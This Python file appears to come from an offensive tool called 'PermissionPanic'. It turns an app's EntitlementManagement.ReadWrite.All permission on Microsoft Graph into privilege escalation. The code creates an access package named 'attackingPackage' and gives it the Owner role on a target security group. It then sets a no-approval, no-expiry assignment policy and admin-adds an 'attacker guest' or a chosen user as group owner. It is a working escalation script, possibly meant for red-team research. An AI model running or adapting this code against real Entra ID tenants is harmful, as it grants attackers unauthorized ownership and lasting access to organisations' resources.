import requests
import colorama
from colorama import Fore, Style

# we approached only to groups. can do things with sharepoint, roles and apps too.

def Entitlement_Vectors(request_headers, EntitlementSettings):
    print()
    print(
        "EntitlementManagement.ReadWrite.All - Allows the app to read and write access packages and related entitlement management resources without a signed-in user. ")
    print()
    try:
        print("Attack vector - privilege escalation")
        create_message_URL = "https://graph.microsoft.com/beta/identityGovernance/entitlementManagement/accessPackageCatalogs?$filter=(displayName eq 'General')"
        result = requests.get(create_message_URL, headers=request_headers)
        json = result.json()
        val = json["value"]
        catalogId = val[0]
        catalogId = catalogId["id"]

        create_message_URL = "https://graph.microsoft.com/beta/identityGovernance/entitlementManagement/accessPackageCatalogs/" + catalogId + "/accessPackageResources?$filter=(displayName+eq+%27" + \
                             EntitlementSettings["CatalogResourceName"] + "%27)&$select=id"

        result = requests.get(create_message_URL, headers=request_headers)
        CatalogResourceId = result.json()
        CatalogResourceId = CatalogResourceId["value"]
        if len(CatalogResourceId) > 0:
            CatalogResourceId = CatalogResourceId[0]
            CatalogResourceId = CatalogResourceId["id"]

            create_message_URL = "https://graph.microsoft.com/beta/identityGovernance/entitlementManagement/accessPackages/"

            message_obj = {
                "catalogId": catalogId,
                "displayName": "attackingPackage",
                "description": "created by PermissionPanic"
            }
            result = requests.post(create_message_URL, json=message_obj, headers=request_headers)

            if result.status_code == 201:
                json = result.json()
                accessPackageID = json["id"]
                create_message_URL = "https://graph.microsoft.com/beta/identityGovernance/entitlementManagement/accessPackages/" + accessPackageID + "/accessPackageResourceRoleScopes"

                message_obj = {
                    "accessPackageResourceRole": {
                        "originId": "Owner_" + EntitlementSettings["resourceId"],
                        "displayName": "Owner",
                        "originSystem": "AadGroup",
                        "accessPackageResource": {
                            "id": CatalogResourceId, "resourceType": "Security Group",
                            "originId": EntitlementSettings["resourceId"], "originSystem": "AadGroup"
                        }
                    },
                    "accessPackageResourceScope": {
                        "originId": EntitlementSettings["resourceId"], "originSystem": "AadGroup"
                    }
                }

                result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
                if result.status_code == 201:  # created access package

                    create_message_URL = "https://graph.microsoft.com/beta/identityGovernance/entitlementManagement/accessPackageAssignmentPolicies"

                    message_obj = {"displayName": "kjhk", "description": "ik", "accessPackageId": accessPackageID,
                                   "expiration": {"type": "noExpiration"}, "canExtend": "false",
                                   "requestApprovalSettings": {
                                       "isApprovalRequired": "false",
                                       "isApprovalRequiredForExtension": "false",
                                       "isRequestorJustificationRequired": "false",
                                       "approvalMode": "NoApproval",
                                       "approvalStages": []
                                   }
                        , "requestorSettings": {"acceptRequests": "true",
                                                                                            "scopeType": "AllExistingDirectorySubjects",
                                                                                            "allowedRequestors": [],
                                                                                            "isOnBehalfAllowed": "false",
                                                                                            "onBehalfRequestors": []},
                                   "isCustomAssignmentScheduleAllowed": "false",
                                   "notificationSettings": "null",
                                   "verifiableCredentialSettings": {"credentialTypes": []}, "questions": [],
                                   "customExtensionHandlers": []}
                    result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
                    print(result.text)
                    json = result.json()
                    policyId = json["id"]

                    if result.status_code == 201:

                        create_message_URL = "https://graph.microsoft.com/beta/identityGovernance/entitlementManagement/accessPackageAssignmentRequests"

                        if EntitlementSettings["isExternalUser"] == "true":
                            print("helooooooooooo")
                            message_obj = {"accessPackageAssignment": {"id": "", "target": {
                                "displayName": "attacker guest", "email": EntitlementSettings["userId"]}, "schedule": {
                                "startDateTime": "2024-03-21T15:58:37.478Z"}, "assignmentPolicyId": policyId,
                                                                       "accessPackageId": accessPackageID}, "id": "",
                                           "requestStatus": "", "requestType": "AdminAdd", "parameters": [],
                                           "answers": []}
                        else:
                            message_obj = {"accessPackageAssignment":{"id":"","target":{"objectId":EntitlementSettings["userId"],"type":"User"},"schedule":{"startDateTime":"2024-03-21T15:58:37.478Z"},"assignmentPolicyId":policyId,"accessPackageId":accessPackageID},"id":"","requestStatus":"","requestType":"AdminAdd","parameters":[],"answers":[]}
                        result = requests.post(create_message_URL, json=message_obj, headers=request_headers) # the user may be in the requests tab even though we can see him in the owners of the group.
                        if result.status_code == 200:
                            print(Fore.GREEN +  "added " + EntitlementSettings["userId"] + " to " + EntitlementSettings["CatalogResourceName"] )
                            print(Style.RESET_ALL)

    except:
        pass
